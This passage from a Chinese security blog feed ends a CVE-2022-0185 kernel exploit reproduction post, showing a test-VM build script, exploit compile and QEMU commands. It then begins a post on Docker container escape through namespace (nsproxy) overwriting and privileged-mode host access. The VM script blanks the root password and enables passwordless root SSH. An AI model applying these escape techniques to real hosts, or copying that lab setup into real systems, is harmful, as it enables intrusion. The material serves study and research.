= <span class="string">&quot;full&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    PREINSTALL_PKGS=<span class="variable">$PREINSTALL_PKGS</span><span class="string">&quot;,&quot;</span><span class="variable">$ADD_PACKAGE</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo rm -rf <span class="variable">$DIR</span></span><br><span class="line">sudo mkdir -p <span class="variable">$DIR</span></span><br><span class="line">sudo chmod 0755 <span class="variable">$DIR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. debootstrap stage</span></span><br><span class="line"></span><br><span class="line">DEBOOTSTRAP_PARAMS=<span class="string">&quot;--arch=<span class="variable">$DEBARCH</span> --no-check-gpg --include=<span class="variable">$PREINSTALL_PKGS</span> --components=main,contrib,non-free,non-free-firmware <span class="variable">$RELEASE</span> <span class="variable">$DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    DEBOOTSTRAP_PARAMS=<span class="string">&quot;--foreign <span class="variable">$DEBOOTSTRAP_PARAMS</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># riscv64 is hosted in the debian-ports repository</span></span><br><span class="line"><span class="comment"># debian-ports doesn&#x27;t include non-free, so we exclude firmware-atheros</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$DEBARCH</span> == <span class="string">&quot;riscv64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    DEBOOTSTRAP_PARAMS=<span class="string">&quot;--keyring /usr/share/keyrings/debian-ports-archive-keyring.gpg --exclude firmware-atheros <span class="variable">$DEBOOTSTRAP_PARAMS</span> http://deb.debian.org/debian-ports&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">sudo --preserve-env=http_proxy,https_proxy,ftp_proxy,no_proxy debootstrap <span class="variable">$DEBOOTSTRAP_PARAMS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. debootstrap stage: only necessary if target != host architecture</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    sudo cp $(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static) <span class="variable">$DIR</span>/$(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static)</span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;/debootstrap/debootstrap --second-stage&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> <span class="variable">$DIR</span>/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/inittab</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nauto eth0\niface eth0 inet dhcp\n&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/dev/root / ext4 defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;securityfs /sys/kernel/security securityfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;configfs /sys/kernel/config/ configfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo tee <span class="variable">$DIR</span>/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;syzkaller&quot;</span> | sudo tee <span class="variable">$DIR</span>/etc/hostname</span><br><span class="line">ssh-keygen -f <span class="variable">$RELEASE</span>.id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line">sudo mkdir -p <span class="variable">$DIR</span>/root/.ssh/</span><br><span class="line">cat <span class="variable">$RELEASE</span>.id_rsa.pub | sudo tee <span class="variable">$DIR</span>/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add perf support</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    cp -r <span class="variable">$KERNEL</span> <span class="variable">$DIR</span>/tmp/</span><br><span class="line">    BASENAME=$(basename <span class="variable">$KERNEL</span>)</span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;apt-get update; apt-get install -y flex bison python-dev libelf-dev libunwind8-dev libaudit-dev libslang2-dev libperl-dev binutils-dev liblzma-dev libnuma-dev&quot;</span></span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cd /tmp/<span class="variable">$BASENAME</span>/tools/perf/; make&quot;</span></span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cp /tmp/<span class="variable">$BASENAME</span>/tools/perf/perf /usr/bin/&quot;</span></span><br><span class="line">    rm -r <span class="variable">$DIR</span>/tmp/<span class="variable">$BASENAME</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add udev rules for custom drivers.</span></span><br><span class="line"><span class="comment"># Create a /dev/vim2m symlink for the device managed by the vim2m driver</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ATTR&#123;name&#125;==&quot;vim2m&quot;, SYMLINK+=&quot;vim2m&quot;&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/udev/rules.d/50-udev-default.rules</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=<span class="variable">$RELEASE</span>.img bs=1M seek=<span class="variable">$SEEK</span> count=1</span><br><span class="line">sudo mkfs.ext4 -F <span class="variable">$RELEASE</span>.img</span><br><span class="line">sudo mkdir -p /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$RELEASE</span>.img /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo cp -a <span class="variable">$DIR</span>/. /mnt/<span class="variable">$DIR</span>/.</span><br><span class="line">sudo umount /mnt/<span class="variable">$DIR</span></span><br></pre></td></tr></table></figure><p>因为我也稍做了点修改，怕以后忘记了这里贴出来记录一下。</p><p>第二个坑就是关于上面提到的内部隔离问题，同样也是在某位师傅的博客文章中提到了在<code>linux kernel 5.14</code>以前不存在内部隔离问题，随即居然以下犯上去说a3师傅写的ctfwiki错了，在经过几天挣扎之后终于注意到了在<code>linux kernel 5.9</code>以前的内部隔离实现。</p><p>再记录一下编译选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -masm=intel -static -no-pie -Wall -D_FILE_OFFSET_BITS=64 -I./libfuse libfuse3.a -g -lpthread -o exp -w</span><br><span class="line"><span class="comment"># make fuse</span></span><br><span class="line">sudo mount bullseye.img rootfs</span><br><span class="line">sudo cp exp rootfs/home/<span class="built_in">test</span></span><br><span class="line">objdump -d ./exp &gt; exp.txt</span><br><span class="line">sudo mkdir rootfs/home/<span class="built_in">test</span>/temp</span><br><span class="line">sudo umount rootfs</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -kernel ./vmlinux \</span><br><span class="line">  -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> \</span><br><span class="line">  -hda ./bullseye.img \</span><br><span class="line">  -enable-kvm -m 3G -nographic \</span><br><span class="line">  -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">  -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p>​<a class="link"   href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/" >https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://zhuanlan.zhihu.com/p/93592262" >https://zhuanlan.zhihu.com/p/93592262<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://www.willsroot.io/2022/01/cve-2022-0185.html" >https://www.willsroot.io/2022/01/cve-2022-0185.html<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://elixir.bootlin.com/linux/v5.4/source" >https://elixir.bootlin.com/linux/v5.4/source<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://github.com/Crusaders-of-Rust/CVE-2022-0185" >https://github.com/Crusaders-of-Rust/CVE-2022-0185<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实并不是很想复现这个洞，但是在前些天fmyy告诉了我一个利用方式&lt;code&gt;fuse&lt;/code&gt;，虽然他也给我推荐了对应的CVE，不过我</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="msg_msg" scheme="https://196082.github.io/tags/msg-msg/"/>
    
    <category term="pipe_buffer" scheme="https://196082.github.io/tags/pipe-buffer/"/>
    
    <category term="Filesystem" scheme="https://196082.github.io/tags/Filesystem/"/>
    
    <category term="fuse" scheme="https://196082.github.io/tags/fuse/"/>
    
    <category term="seq_operations" scheme="https://196082.github.io/tags/seq-operations/"/>
    
  </entry>
  
  <entry>
    <title>浅尝docker escape</title>
    <link href="https://196082.github.io/2023/09/30/%E6%B5%85%E5%B0%9Ddocker-escape/"/>
    <id>https://196082.github.io/2023/09/30/%E6%B5%85%E5%B0%9Ddocker-escape/</id>
    <published>2023-09-30T03:17:07.000Z</published>
    <updated>2023-11-29T10:10:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期因为工作上的内容比较多压得比较紧所以一直没有去学习新的东西，也没有更新博客。所以最近呢也就挑一个比较简单一点的东西学了一下。在紧跟着的下一篇文章可能是关于<code>syzkaller</code>的，或者就是我前阵子分析的<code>Stack Rot</code>，时间多的话可能还会去更新一下<code>Rootkit</code>。</p><p>这里会介绍因为配置问题引起的逃逸，但是更多的会讲解如何利用内核漏洞实现逃逸，以及通过内核漏洞实现逃逸的原理。</p><h2 id="Linux-kernel-namespace机制"><a href="#Linux-kernel-namespace机制" class="headerlink" title="Linux  kernel namespace机制"></a>Linux  kernel namespace机制</h2><p><code>Linux Namespaces</code>机制提供一种资源隔离方案。PID,IPC,Network等系统资源不再是全局性的，而是属于某个特定的<code>Namespace</code>。每个<code>namespace</code>下的资源对于其他<code>namespace</code>下的资源都是透明，不可见的。因此在操作系统层面上看，就会出现多个相同pid的进程。系统中可以同时存在两个进程号为0,1,2的进程，由于属于不同的<code>namespace</code>，所以它们之间并不冲突。而在用户层面上只能看到属于用户自己<code>namespace</code>下的资源，例如使用ps命令只能列出自己<code>namespace</code>下的进程。这样每个<code>namespace</code>看上去就像一个单独的<code>Linux</code>系统。</p><p><img   src="/images/2015-08-06-1.jpg" ></p><h3 id="Linux-kernel中namespace结构体"><a href="#Linux-kernel中namespace结构体" class="headerlink" title="Linux kernel中namespace结构体"></a>Linux kernel中namespace结构体</h3><p>当前Linux支持以下八种<code>namespace</code>，具体的含义这里就不过多赘述了，网上存在很多相关资料。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span> count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uts_namespace</span> *<span class="title">uts_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ipc_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> *<span class="title">mnt_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">pid_ns_for_children</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span>      *<span class="title">net_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">time_namespace</span> *<span class="title">time_ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">time_namespace</span> *<span class="title">time_ns_for_children</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cgroup_namespace</span> *<span class="title">cgroup_ns</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里更多关注的是<code>namespace</code>与进程之间的关系，既然这么说那么肯定是存在关系的，我们又知道的是内核中使用的是<code>task_struct</code>结构体描述当前进程的状态，那么势必在其结构体汇总存在一个成员是与<code>namespace</code>相关的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="comment">/* Cached requested key. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>*<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span><span class="title">sysvsem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span><span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DETECT_HUNG_TASK</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>last_switch_count;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>last_switch_time;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Filesystem information: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span>*<span class="title">fs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Open file information: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span>*<span class="title">files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IO_URING</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span>*<span class="title">io_uring</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Namespaces: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span>*<span class="title">nsproxy</span>;</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到存在一个成员为<code>nsproxy</code>的指针，其指向的就是<code>nsproxy</code>结构体。并且相比各位应该能够注意到在<code>nsproxy</code>结构体中的<code>count</code>成员，这个成员在内核的很多结构体中都存在，一般被当作被引用的次数，那么这里的这个成员也是同样的含义。一般出现这样一个成员就代表该结构可以被多个地方使用，那么对于这里来说就是多个进程可以使用同一个<code>nsproxy</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> <span class="title">init_nsproxy</span> =</span> &#123;</span><br><span class="line">.count= ATOMIC_INIT(<span class="number">1</span>),</span><br><span class="line">.uts_ns= &amp;init_uts_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)</span></span><br><span class="line">.ipc_ns= &amp;init_ipc_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.mnt_ns= <span class="literal">NULL</span>,</span><br><span class="line">.pid_ns_for_children= &amp;init_pid_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET</span></span><br><span class="line">.net_ns= &amp;init_net,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUPS</span></span><br><span class="line">.cgroup_ns= &amp;init_cgroup_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TIME_NS</span></span><br><span class="line">.time_ns= &amp;init_time_ns,</span><br><span class="line">.time_ns_for_children= &amp;init_time_ns,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然而在内核中存在一个默认的<code>nsproxy</code>，即为上面的<code>init_nsproxy</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">init_task</span></span></span><br><span class="line"><span class="class">#<span class="title">ifdef</span> <span class="title">CONFIG_ARCH_TASK_STRUCT_ON_STACK</span></span></span><br><span class="line"><span class="class">__<span class="title">init_task_data</span></span></span><br><span class="line"><span class="class">#<span class="title">endif</span></span></span><br><span class="line"><span class="class">__<span class="title">aligned</span>(<span class="title">L1_CACHE_BYTES</span>)</span></span><br><span class="line"><span class="class">=</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">.thread_info= INIT_THREAD_INFO(init_task),</span><br><span class="line">.stack_refcount= REFCOUNT_INIT(<span class="number">1</span>),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.__state= <span class="number">0</span>,</span><br><span class="line">.<span class="built_in">stack</span>= init_stack,</span><br><span class="line">.usage= REFCOUNT_INIT(<span class="number">2</span>),</span><br><span class="line">.flags= PF_KTHREAD,</span><br><span class="line">.prio= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">.static_prio= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">.normal_prio= MAX_PRIO - <span class="number">20</span>,</span><br><span class="line">.policy= SCHED_NORMAL,</span><br><span class="line">.cpus_ptr= &amp;init_task.cpus_mask,</span><br><span class="line">.user_cpus_ptr= <span class="literal">NULL</span>,</span><br><span class="line">.cpus_mask= CPU_MASK_ALL,</span><br><span class="line">.nr_cpus_allowed= NR_CPUS,</span><br><span class="line">.mm= <span class="literal">NULL</span>,</span><br><span class="line">.active_mm= &amp;init_mm,</span><br><span class="line">.restart_block= &#123;</span><br><span class="line">.fn = do_no_restart_syscall,</span><br><span class="line">&#125;,</span><br><span class="line">.se= &#123;</span><br><span class="line">.group_node = LIST_HEAD_INIT(init_task.se.group_node),</span><br><span class="line">&#125;,</span><br><span class="line">.rt= &#123;</span><br><span class="line">.run_list= LIST_HEAD_INIT(init_task.rt.run_list),</span><br><span class="line">.time_slice= RR_TIMESLICE,</span><br><span class="line">&#125;,</span><br><span class="line">.tasks= LIST_HEAD_INIT(init_task.tasks),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">.pushable_tasks= PLIST_NODE_INIT(init_task.pushable_tasks, MAX_PRIO),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_SCHED</span></span><br><span class="line">.sched_task_group = &amp;root_task_group,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.ptraced= LIST_HEAD_INIT(init_task.ptraced),</span><br><span class="line">.ptrace_entry= LIST_HEAD_INIT(init_task.ptrace_entry),</span><br><span class="line">.real_parent= &amp;init_task,</span><br><span class="line">.parent= &amp;init_task,</span><br><span class="line">.children= LIST_HEAD_INIT(init_task.children),</span><br><span class="line">.sibling= LIST_HEAD_INIT(init_task.sibling),</span><br><span class="line">.group_leader= &amp;init_task,</span><br><span class="line">RCU_POINTER_INITIALIZER(real_cred, &amp;init_cred),</span><br><span class="line">RCU_POINTER_INITIALIZER(cred, &amp;init_cred),</span><br><span class="line">.comm= INIT_TASK_COMM,</span><br><span class="line">.thread= INIT_THREAD,</span><br><span class="line">.fs= &amp;init_fs,</span><br><span class="line">.files= &amp;init_files,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_IO_URING</span></span><br><span class="line">.io_uring= <span class="literal">NULL</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.signal= &amp;init_signals,</span><br><span class="line">.sighand= &amp;init_sighand,</span><br><span class="line">.nsproxy= &amp;init_nsproxy,</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(init_task);</span><br></pre></td></tr></table></figure><p>其会被直接加载进入到<code>init_task</code>之中。</p><p>在Linux系统中，PID为1的进程被称为<code>init</code>进程，系统中的所有进程都是通过<code>init</code>进程直接或者间接<code>fork</code>而来的。自然而然，宿主机上没有经过容器化的进程，他们位于同一组<code>namespace</code>中，所以会共享同一个<code>struct nsproxy</code>结构体，如下图，容器内的进程的<code>namespace</code>与其余进程不一致。</p><p><img   src="/images/image-20230929180710629.png"  alt="image-20230929180710629"></p><p>于是乎可以得出这样的结论，如果可以把容器内的<code>exp</code>进程的<code>nsproxy</code>修改为<code>init_proxy</code>就可以实现突破，达到逃逸的目的了。</p><h2 id="Docker-环境判断"><a href="#Docker-环境判断" class="headerlink" title="Docker 环境判断"></a>Docker 环境判断</h2><h3 id="查找-dockerenv-文件"><a href="#查找-dockerenv-文件" class="headerlink" title="查找 .dockerenv 文件"></a>查找 .dockerenv 文件</h3><p>docker下默认存在dockerenv文件，而非docker环境中则没有</p><p><img   src="/images/image-20230929182050141.png"  alt="image-20230929182050141"></p><h3 id="查询-cgroup-进程"><a href="#查询-cgroup-进程" class="headerlink" title="查询 cgroup 进程"></a>查询 cgroup 进程</h3><p><img   src="/images/image-20230929182215876.png"  alt="image-20230929182215876"></p><h2 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h2><h3 id="特权模式逃逸"><a href="#特权模式逃逸" class="headerlink" title="特权模式逃逸"></a>特权模式逃逸</h3><p>以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh密钥、计划任务等方式达到逃逸。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@7fbc86e39373:~<span class="comment"># docker run -it --privileged 镜像id /bin/bash</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 